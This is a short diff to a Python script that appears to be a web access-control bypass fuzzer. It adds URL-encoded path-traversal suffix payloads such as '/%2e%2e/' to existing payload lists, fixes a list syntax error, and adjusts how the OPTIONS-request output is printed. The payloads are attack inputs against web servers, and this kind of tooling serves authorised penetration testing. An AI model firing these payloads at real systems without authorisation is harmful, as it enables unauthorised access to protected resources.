@@ -32,7 +32,7 @@ prefixPayloads = [
 '/%252f', '/%252e/', '/%252e%252f/', '/%252e%252e%252f/']
 
 suffixPayloads = [
-';', '/', '/./', '/../'. '.html','.json','#', '/%20']
+';', '/', '%2f', '/./', '/%2e/', '/../', '/%2e%2e/', '.html', '.json', '#', '/%20']
 
 def preAndPost(parsed):
 	finalUrls = []
@@ -75,8 +75,11 @@ def sendFinalPayloads(finalUrls):
 
 def sendOPTIONS():
 	resp = requests.options(url, headers=headers, verify=False)
-	print("Response code: {}   Response length: {}   Sent OPTIONS method. \n\
-Response length was 0 so probably NOT worth checking out....\n".format(resp.status_code, len(resp.text)))
+	print("Response code: {}   Response length: {}   Sent OPTIONS method. \n".format(resp.status_code, len(resp.text)))
+
+	if len(resp.text) < 1:
+		print("Response length was 0 so probably NOT worth checking out....\n")
+
 	print("Response Headers: ")
 	for h,v in resp.request.headers.items():
 		print("{}: {}".format(h,v))
